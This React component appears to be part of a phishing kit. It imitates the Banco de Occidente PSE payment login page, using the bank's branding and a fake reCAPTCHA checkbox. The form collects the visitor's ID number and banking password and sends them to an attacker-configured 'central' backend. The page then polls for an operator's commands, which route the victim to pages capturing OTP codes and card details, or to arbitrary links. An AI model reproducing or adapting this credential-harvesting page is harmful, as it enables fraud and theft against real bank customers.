import React, { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingOccidente from "../../../../../components/LoadingOccidente";
import brandLogo from "../../img/logo-occidente.svg";
import errorLogoOccidente from "../../img/error_logo_occidente.svg";
import logoAval from "../../img/logo_aval.svg";
import logoCaptcha from "../../img/logo_cap.png";
import logoVigilado from "../../img/logo_vigilado.svg";
import slideOne from "../../img/sliders/slider-1.jpeg";
import slideTwo from "../../img/sliders/slider-2.jpeg";
import slideThree from "../../img/sliders/slider-3.jpeg";
import slideFour from "../../img/sliders/slider-4.jpeg";
import slideFive from "../../img/sliders/slider-5.jpeg";
import logoEscudo from "../../img/sliders/logo_escudo.png";
import "./login_occidente_pse.css";

const OCCIDENTE_ERROR_KEY = "occidente_error_modal";
const OCCIDENTE_MID_FLOW_KEY = "occidente_mid_flow";
const OCCIDENTE_ERROR_LOGIN_MSG =
  "No pudimos completar tu transacción, verifica tus datos e intenta nuevamente.";

const OCCIDENTE_ERROR_MODAL_AUTO_HIDE_MS = 7000;

const ESTADOS_TRAS_LOGIN = [
  "sol_otp",
  "sol_tc",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_login",
  "block_ip",
  "error_blocked",
];

// Se crea la constante
const documentOptions = [
  { value: "CC", label: "C.C. - Cédula de Ciudadanía" },
  { value: "CE", label: "C.E. - Cédula de extranjería" },
  { value: "TI", label: "T.I. - Tarjeta de Identidad" },
  { value: "PS", label: "PS - Pasaporte" },
  { value: "NIT", label: "NIT - Número de Identificación Tributaria" },
  { value: "RC", label: "R.C. - Registro Civil" },
  { value: "PE", label: "P.E. - Permiso Especial de Permanencia" },
];

const OCCIDENTE_DOC_RULES = {
  CC: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de ciudadanía debe tener entre 6 y 10 dígitos.",
    digitsOnly: true,
  },
  CE: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de extranjería debe tener entre 6 y 10 dígitos.",
    digitsOnly: true,
  },
  TI: {
    maxLen: 11,
    test: (n) => /^\d{10,11}$/.test(n),
    hint: "La tarjeta de identidad debe tener 10 u 11 dígitos.",
    digitsOnly: true,
  },
  PS: {
    maxLen: 15,
    test: (n) => /^[A-Z0-9]{6,15}$/.test(n),
    hint: "El pasaporte debe tener entre 6 y 15 caracteres alfanuméricos.",
    digitsOnly: false,
  },
  NIT: {
    maxLen: 10,
    test: (n) => /^\d{9,10}$/.test(n),
    hint: "El NIT debe tener 9 o 10 dígitos.",
    digitsOnly: true,
  },
  RC: {
    maxLen: 11,
    test: (n) => /^\d{10,11}$/.test(n),
    hint: "El registro civil debe tener 10 u 11 dígitos.",
    digitsOnly: true,
  },
  PE: {
    maxLen: 15,
    test: (n) => /^\d{6,15}$/.test(n),
    hint: "El permiso especial de permanencia debe tener entre 6 y 15 dígitos.",
    digitsOnly: true,
  },
};

const OCCIDENTE_GENERIC_DOC_RULE = {
  maxLen: 15,
  test: (n) => /^\d{6,15}$/.test(n),
  hint: "El número de documento debe tener entre 6 y 15 dígitos.",
  digitsOnly: true,
};

const OCCIDENTE_STRICT_PASSWORD_DOC_TYPES = new Set(["CC", "CE", "TI", "PS"]);

const OCCIDENTE_PASSWORD_HINT =
  "La contraseña debe tener al menos 8 caracteres, incluir letras, números, un carácter especial y al menos una letra en mayúscula.";

const usesStrictOccidentePassword = (docType) =>
  OCCIDENTE_STRICT_PASSWORD_DOC_TYPES.has(docType);

const getOccidenteDocRule = (docType) =>
  OCCIDENTE_DOC_RULES[docType] ?? OCCIDENTE_GENERIC_DOC_RULE;

const sanitizeOccidenteNumeroDocumento = (docType, raw) => {
  const rule = getOccidenteDocRule(docType);

  if (rule.digitsOnly) {
    return String(raw || "").replace(/\D/g, "").slice(0, rule.maxLen);
  }

  return String(raw || "")
    .replace(/[^A-Za-z0-9]/g, "")
    .toUpperCase()
    .slice(0, rule.maxLen);
};

const getOccidenteDocumentError = (docType, numero) => {
  if (numero === "") return null;

  const rule = getOccidenteDocRule(docType);

  if (rule.digitsOnly && !/^\d+$/.test(numero)) {
    return "El número de identificación solo debe contener dígitos.";
  }

  if (!rule.digitsOnly && !/^[A-Z0-9]+$/.test(numero)) {
    return "El número de identificación solo debe contener letras y números.";
  }

  return rule.test(numero) ? null : rule.hint;
};

const isValidOccidentePassword = (value, docType) => {
  const pwd = String(value || "");
  if (pwd.length === 0) return false;

  if (!usesStrictOccidentePassword(docType)) {
    return true;
  }

  return (
    pwd.length >= 8 &&
    /[A-Z]/.test(pwd) &&
    /[a-zA-Z]/.test(pwd) &&
    /[0-9]/.test(pwd) &&
    /[^A-Za-z0-9]/.test(pwd)
  );
};

const slides = [slideOne, slideTwo, slideThree, slideFour, slideFive];

// Se crea el componente
function LoginOccidentePse() {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan los estados
  const [activeSlide, setActiveSlide] = useState(0);
  const [isDocMenuOpen, setIsDocMenuOpen] = useState(false);
  const [selectedDocument, setSelectedDocument] = useState(documentOptions[0]);
  const [identificationValue, setIdentificationValue] = useState("");
  const [passwordValue, setPasswordValue] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [captchaState, setCaptchaState] = useState("idle");
  const [isCaptchaExpired, setIsCaptchaExpired] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");

  // Se declara el estado para el loading
  const [getLoading, setLoading] = useState(false);

  // Se crea el ref
  const docMenuRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const closeModalRef = useRef(() => {});

  const identificationError = useMemo(
    () => getOccidenteDocumentError(selectedDocument.value, identificationValue),
    [selectedDocument.value, identificationValue],
  );

  const passwordError = useMemo(() => {
    if (passwordValue === "") return null;
    if (!usesStrictOccidentePassword(selectedDocument.value)) return null;
    return isValidOccidentePassword(passwordValue, selectedDocument.value)
      ? null
      : OCCIDENTE_PASSWORD_HINT;
  }, [passwordValue, selectedDocument.value]);

  const identificationMaxLength = useMemo(
    () => getOccidenteDocRule(selectedDocument.value).maxLen,
    [selectedDocument.value],
  );

  const isIdentificationValid =
    identificationValue.trim().length > 0 && identificationError === null;

  const isPasswordValid = isValidOccidentePassword(
    passwordValue,
    selectedDocument.value,
  );

  const isSubmitEnabled =
    isIdentificationValid &&
    isPasswordValid &&
    captchaState === "verified" &&
    !isCaptchaExpired;

  const clearLoginFormFields = () => {
    setIdentificationValue("");
    setPasswordValue("");
    setShowPassword(false);
    setIsDocMenuOpen(false);
    setSelectedDocument(documentOptions[0]);
    setCaptchaState("idle");
    setIsCaptchaExpired(false);
  };

  const openLoginErrorModal = (message) => {
    setLoading(false);
    clearLoginFormFields();
    setModalText(message);
    setShowModal(true);
  };

  // Se crea el useEffect para verificar el estado de la sesion
  useEffect(() => {

    // Se captura el estado de error
    const pendingError = localStorage.getItem(OCCIDENTE_ERROR_KEY);
    const midFlow = sessionStorage.getItem(OCCIDENTE_MID_FLOW_KEY) === "1";
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

    // Se valida si el estado de error es error de login
    if (pendingError === "error_login") {

      // Se setea el estado de error
      modalBloqueoEstadoRef.current = "error_login";

      // Se muestra el modal y se limpian los campos del formulario
      openLoginErrorModal(OCCIDENTE_ERROR_LOGIN_MSG);
    } else if (pendingError === "block_ip") {

      // Se muestra el modal de bloqueo y se limpian los campos
      openLoginErrorModal("Acceso bloqueado por seguridad.");
    }

    // Se limpia el marcador de error para evitar reprocesarlo
    if (pendingError) {
      localStorage.removeItem(OCCIDENTE_ERROR_KEY);
    }

    if (pseHandoff) {

      // Se guarda la sessionId del handoff en localStorage
      localStorage.setItem("sessionId", pseHandoff);

      // Se actualiza la sessionId con el handoff de /pse
      sessionIdRef.current = pseHandoff;
      lastEstadoRef.current = null;

      // Se remueve el handoff
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se remueve mid flow previo para no arrancar en loading antes del ingreso
      sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling hasta enviar el login
      allowPollNavigationRef.current = false;

      // Se asegura que no quede cargando al llegar desde /pse
      setLoading(false);
    } else if (midFlow) {

      // Post-submit + F5: reanuda loading y polling sin permitir reenviar credenciales
      const sid = localStorage.getItem("sessionId");
      sessionIdRef.current = sid;

      if (sid) {

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se muestra loading mientras espera respuesta del operador
        setLoading(true);

        // Se inicia el polling
        initPolling();
      }
    } else {

      // Flujo inicial: mantiene la session existente y no inicia polling hasta el submit
      sessionIdRef.current = localStorage.getItem("sessionId");

      // Se desactiva la navegacion por polling hasta enviar el login
      allowPollNavigationRef.current = false;
    }

    // Se remueve el polling
    return () => {

      // Se para el polling
      stopPolling();
    };
  }, []);

  // Se crea el useEffect del carrusel de fondo
  useEffect(() => {

    const intervalId = setInterval(() => {
      setActiveSlide((prev) => (prev + 1) % slides.length);
    }, 4500);

    return () => clearInterval(intervalId);
  }, []);

  // Se crea el useEffect para cerrar el menu de documento
  useEffect(() => {
    const handleOutsideClick = (event) => {
      if (docMenuRef.current && !docMenuRef.current.contains(event.target)) {
        setIsDocMenuOpen(false);
      }
    };

    document.addEventListener("mousedown", handleOutsideClick);
    return () => document.removeEventListener("mousedown", handleOutsideClick);
  }, []);

  // Se crea el useEffect para expirar el captcha
  useEffect(() => {
    if (captchaState !== "verified") return undefined;

    const expireTimeoutId = window.setTimeout(() => {
      setCaptchaState("idle");
      setIsCaptchaExpired(true);
    }, 60000);

    return () => window.clearTimeout(expireTimeoutId);
  }, [captchaState]);

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si el intervalo de polling existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    };
  };

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado
    verifyState();
  };

  // Se crea el metodo para redirigir rutas internas
  const redirigir = (ruta) => {

    // Se redirige a la ruta indicada
    navigate(ruta);
  };

  // Se crea el metodo para verificar el estado
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(
        `/occidente/verify-state/${sessionIdRef.current}`,
      );

      // Se captura la respuesta
      const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se capturan los valores
      const estado = (estadoRaw || "").toLowerCase();

      // Se valida si la url es diferente de null
      const hasUrl = Boolean(url && String(url).trim());

      // Se captura la url custom
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

      // Se valida si el link es pendiente
      const linkPendiente =
        estado === "sol_link_bot" ||
        (estado === "link_bot" && !hasUrl) ||
        (estado === "sol_link_custom" && !customLink);

      // Se valida si el estado es diferente de null
      if (!estado) return;

      // Se valida si el estado es diferente de null
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado es diferente del estado actual
        if (estado === ignorarEstadoHastaCambioRef.current) return;

        // Se actualiza el estado actual
        ignorarEstadoHastaCambioRef.current = null;

        // Se actualiza el estado actual
        modalBloqueoEstadoRef.current = null;
      }

      // Se valida si el estado es diferente del estado actual
      if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) return;

      // Se valida si el estado es diferente del estado actual
      if (ESTADOS_TRAS_LOGIN.includes(estado) && !allowPollNavigationRef.current) return;

      // Se valida si el estado es diferente del estado actual
      if (!linkPendiente && lastEstadoRef.current === estado) return;

      // Se actualiza el estado actual
      if (!linkPendiente) lastEstadoRef.current = estado;

      // Se valida el estado
      switch (estado) {

        // ------------ Casos botones linea 1 ------------
        case "sol_otp":
        case "sol_tc":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

          // Se redirige al flujo OTP generico si la sesión es TC
          if (estado === "sol_otp" && isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se redirige a la pantalla OTP Occidente
            redirigir("/occidente_otp_pse");
          }

          // Se sale del switch
          break;
        case "error_otp":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

          // Se setea el estado de error
          localStorage.setItem(OCCIDENTE_ERROR_KEY, "error_otp");

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se redirige a la pantalla OTP Occidente
            redirigir("/occidente_otp_pse");
          }

          // Se sale del switch
          break;
        case "error_login":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de error de login
          modalBloqueoEstadoRef.current = "error_login";

          // Se muestra el modal y se limpian los campos del formulario
          openLoginErrorModal(OCCIDENTE_ERROR_LOGIN_MSG);

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

          // Se limpia el storage de la sesion
          localStorage.clear();
          sessionStorage.clear();

          // Se redirige al finalizado TC cuando la sesión viene por tarjeta
          if (isTcSession) {

            // Se redirige al finalizado de TC Legacy
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige al finalizado PSE legacy
            window.location.href = "/finalizado-pse?sessionId=" + sessionIdRef.current;
          }

          // Se sale del switch
          break;
        case "link_bot":

          // Se valida si existe la url
          if (hasUrl) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

            // Se redirige a la pagina
            window.location.href = url;
          }

          // Se sale del switch
          break;
        case "sol_link_custom":

          // Se valida si existe el link custom
          if (customLink) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

            // Se redirige a la pagina
            window.location.href = customLink;
          }
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se muestra el modal de bloqueo y se limpian los campos
          openLoginErrorModal("Acceso bloqueado por seguridad.");

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se captura el status
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();

      // Se valida si el status es 403 y el estado del error es error_blocked
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el cargando
        setLoading(false);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se crea el metodo para cerrar el modal de error de login
  const closeModal = () => {

    // Se captura el estado del servidor
    const estadoServidor = modalBloqueoEstadoRef.current;

    // Se resetea el estado del servidor
    modalBloqueoEstadoRef.current = null;

    // Se valida si el estado del servidor es error de login
    if (estadoServidor === "error_login") {

      // Se ignora el estado de cambio
      ignorarEstadoHastaCambioRef.current = "error_login";
    }

    // Se cierra el modal de error de login
    setShowModal(false);

    // Se quita el cargando y se limpian los campos del formulario
    setLoading(false);
    clearLoginFormFields();

    // Se remueve el mid flow para permitir un nuevo intento de login
    sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

    // Se desactiva la navegacion por polling hasta un nuevo submit
    allowPollNavigationRef.current = false;
  };

  closeModalRef.current = closeModal;

  useEffect(() => {
    if (!showModal) return undefined;

    const timer = window.setTimeout(() => {
      closeModalRef.current();
    }, OCCIDENTE_ERROR_MODAL_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showModal]);

  // Se crea el metodo para manejar el captcha
  const handleCaptchaClick = () => {
    if (captchaState !== "idle") return;
    setIsCaptchaExpired(false);
    setCaptchaState("loading");
    window.setTimeout(() => {
      setCaptchaState("verified");
    }, 1200);
  };

  const handleDocumentSelect = (option) => {
    setSelectedDocument(option);
    setIsDocMenuOpen(false);
    setIdentificationValue((prev) =>
      sanitizeOccidenteNumeroDocumento(option.value, prev),
    );
  };

  const handleIdentificationChange = (event) => {
    setIdentificationValue(
      sanitizeOccidenteNumeroDocumento(
        selectedDocument.value,
        event.target.value,
      ),
    );
  };

  const handlePasswordChange = (event) => {
    setPasswordValue(event.target.value);
  };

  // Metodo encargado de manejar el submit del formulario
  const handleSubmit = async (event) => {

    // Se previene el comportamiento por defecto del formulario
    event.preventDefault();

    // Se valida si el cargando esta activo
    if (!isSubmitEnabled || getLoading) return;

    // Se captura la sessionId del localStorage
    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;

    // Se captura la url central
    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    // Se inicializa la data a enviar
    const dataSend = {
      data: {
        attributes: {
          usuario: identificationValue,
          clave: passwordValue,
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/occidente/authenticacion",
          tipoDocumento: selectedDocument.value,
        },
      },
    };

    // Se para el polling
    stopPolling();

    // Se resetea el estado actual
    lastEstadoRef.current = null;

    // Se usa el try catch
    try {

      // Se setea el cargando
      setLoading(true);

      // Se realiza la peticion al backend
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/occidente/authenticacion", dataSend);

      // Se valida la respuesta
      if (response?.data?.success) {

        // Se captura la sessionId
        const sid = response.data.sessionId ?? sessionId;

        // Se guarda la sessionId en el localStorage
        localStorage.setItem("sessionId", sid);

        // Se actualiza la sessionId
        sessionIdRef.current = sid;

        // Se marca que el login ya fue enviado (recuperacion tras F5)
        sessionStorage.setItem(OCCIDENTE_MID_FLOW_KEY, "1");

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se muestra el modal y se limpian los campos del formulario
        openLoginErrorModal(OCCIDENTE_ERROR_LOGIN_MSG);
      }
    } catch (error) {

      // Se quita el cargando
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura el status
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();

      // Se valida si el status es 403 y el estado del error es error_blocked
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(OCCIDENTE_MID_FLOW_KEY);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }

      // Se muestra el modal y se limpian los campos del formulario
      openLoginErrorModal(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    }
  };

  // Renderiza el componente
  return (
    <div className="occidente-pse-page">
      <img
        src={logoVigilado}
        alt="Logo Vigilado"
        className="occidente-pse-vigilado"
      />

      <div className="occidente-pse-hero">
        {slides.map((slideSrc, index) => (
          <img
            key={slideSrc}
            src={slideSrc}
            alt="Fondo Banco de Occidente"
            className={`occidente-pse-slide ${index === activeSlide ? "active" : ""}`}
          />
        ))}
      </div>

      <section className="occidente-pse-panel">
        {showModal ? (
          <div
            className="occidente-pse-login-error"
            role="alertdialog"
            aria-modal="true"
            aria-labelledby="occidente-login-error-title"
            aria-describedby="occidente-login-error-message"
          >
            <div className="occidente-pse-login-error-content">
              <img
                src={brandLogo}
                alt="Banco de Occidente"
                className="occidente-pse-login-error-brand"
              />
              <h2
                id="occidente-login-error-title"
                className="occidente-pse-login-error-title"
              >
                LO SENTIMOS
              </h2>
              <img
                src={errorLogoOccidente}
                alt=""
                aria-hidden="true"
                className="occidente-pse-login-error-illustration"
              />
              <p
                id="occidente-login-error-message"
                className="occidente-pse-login-error-message"
              >
                {modalText}
              </p>
            </div>
          </div>
        ) : null}

        <div className="occidente-pse-security">
          <span className="occidente-pse-security-icon" aria-hidden="true">
            <img src={logoEscudo} alt="" className="occidente-pse-security-icon-img" />
          </span>
          <span>Seguridad</span>
        </div>

        <div className="occidente-pse-header">
          <img
            src={brandLogo}
            alt="Banco de Occidente"
            className="occidente-pse-brand"
          />
          <p className="occidente-pse-welcome">¡Bienvenido! a tus,</p>
          <h1>Pagos Electrónicos</h1>
        </div>

        <form
          className="occidente-pse-form"
          onSubmit={handleSubmit}
        >
          <label>Identificación</label>
          <div className="occidente-pse-id-row">
            <div className="occidente-pse-doc-select" ref={docMenuRef}>
              <button
                type="button"
                className={`occidente-pse-doc-trigger ${isDocMenuOpen ? "open" : ""}`}
                onClick={() => setIsDocMenuOpen((prev) => !prev)}
                aria-expanded={isDocMenuOpen}
              >
                <span>{selectedDocument.value}</span>
                <span className="occidente-pse-doc-chevron">⌄</span>
              </button>

              {isDocMenuOpen && (
                <div className="occidente-pse-doc-menu">
                  {documentOptions.map((option, index) => (
                    <button
                      key={option.value}
                      type="button"
                      className={`occidente-pse-doc-option ${selectedDocument.value === option.value ? "default-focus" : ""}`}
                      onClick={(event) => {
                        handleDocumentSelect(option);
                        event.currentTarget.blur();
                      }}
                    >
                      {option.label}
                    </button>
                  ))}
                </div>
              )}
            </div>
            <input
              type="text"
              placeholder="Ej.:1093238993"
              value={identificationValue}
              onChange={handleIdentificationChange}
              inputMode={
                getOccidenteDocRule(selectedDocument.value).digitsOnly
                  ? "numeric"
                  : "text"
              }
              maxLength={identificationMaxLength}
              aria-invalid={Boolean(identificationError)}
            />
          </div>
          {identificationError ? (
            <p className="occidente-pse-field-hint" role="alert">
              {identificationError}
            </p>
          ) : null}

          <label>Contraseña</label>
          <div className="occidente-pse-password-row">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Ingresa tu contraseña"
              value={passwordValue}
              onChange={handlePasswordChange}
              aria-invalid={Boolean(passwordError)}
            />
            <button
              type="button"
              className="occidente-pse-eye"
              aria-label="Mostrar u ocultar contraseña"
              data-tooltip={
                showPassword ? "Ocultar contraseña" : "Mostrar contraseña"
              }
              onClick={() => setShowPassword((prev) => !prev)}
            >
              {showPassword ? (
                <svg viewBox="0 0 24 24" role="presentation" aria-hidden="true">
                  <path
                    d="M2 12s3.636-7 10-7 10 7 10 7-3.636 7-10 7S2 12 2 12z"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.6"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="3"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.6"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              ) : (
                <svg viewBox="0 0 24 24" role="presentation" aria-hidden="true">
                  <path
                    d="M2 12s3.636-7 10-7 10 7 10 7-3.636 7-10 7S2 12 2 12z"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.6"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="3"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.6"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <line
                    x1="20"
                    y1="4"
                    x2="4"
                    y2="20"
                    stroke="currentColor"
                    strokeWidth="1.6"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              )}
            </button>
          </div>
          {passwordError ? (
            <p className="occidente-pse-field-hint" role="alert">
              {passwordError}
            </p>
          ) : null}

          <div className="occidente-pse-captcha-wrapper">
            <div
              className={`occidente-pse-captcha ${isCaptchaExpired ? "has-error" : ""}`}
            >
              {isCaptchaExpired ? (
                <p className="occidente-pse-captcha-error">
                  La verificación ha caducado. Vuelve a marcar la casilla de
                  verificación.
                </p>
              ) : null}
              <button
                type="button"
                className={`occidente-pse-check ${captchaState} ${isCaptchaExpired && captchaState === "idle" ? "expired" : ""}`}
                onClick={handleCaptchaClick}
                aria-label="No soy un robot"
              >
                {captchaState === "loading" ? (
                  <span className="occidente-pse-spinner" aria-hidden="true" />
                ) : null}
                {captchaState === "verified" ? (
                  <span
                    className="occidente-pse-verified-icon"
                    aria-hidden="true"
                  >
                    ✓
                  </span>
                ) : null}
              </button>
              <div className="occidente-pse-captcha-copy">
                <span>No soy un robot</span>
              </div>
              <div className="occidente-pse-captcha-brand">
                <img
                  src={logoCaptcha}
                  alt="reCAPTCHA"
                  className="occidente-pse-captcha-logo"
                />
                <small>reCAPTCHA</small>
              </div>
            </div>
          </div>

          <div className="occidente-pse-actions">
            <button type="button" className="back">
              <span className="occidente-pse-back-arrow" aria-hidden="true">
                ←
              </span>
              <span>Volver al comercio</span>
            </button>
            <button type="submit" className="login" disabled={!isSubmitEnabled || getLoading}>
              <svg
                className="occidente-pse-login-lock"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="1.9"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <rect x="5" y="11" width="14" height="10" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                <circle
                  cx="9"
                  cy="16"
                  r="0.8"
                  fill="currentColor"
                  stroke="none"
                />
                <circle
                  cx="12"
                  cy="16"
                  r="0.8"
                  fill="currentColor"
                  stroke="none"
                />
                <circle
                  cx="15"
                  cy="16"
                  r="0.8"
                  fill="currentColor"
                  stroke="none"
                />
              </svg>
              <span>Ingresar</span>
            </button>
          </div>
        </form>
      </section>

      <div className="occidente-pse-footer-brand">
        <span className="occidente-pse-version">v5.2.3.2</span>
        <img src={logoAval} alt="Grupo Aval" className="occidente-pse-aval" />
      </div>

      {getLoading ? <LoadingOccidente isOpen /> : null}
    </div>
  );
}

// Se exporta el componente
export default LoginOccidentePse;
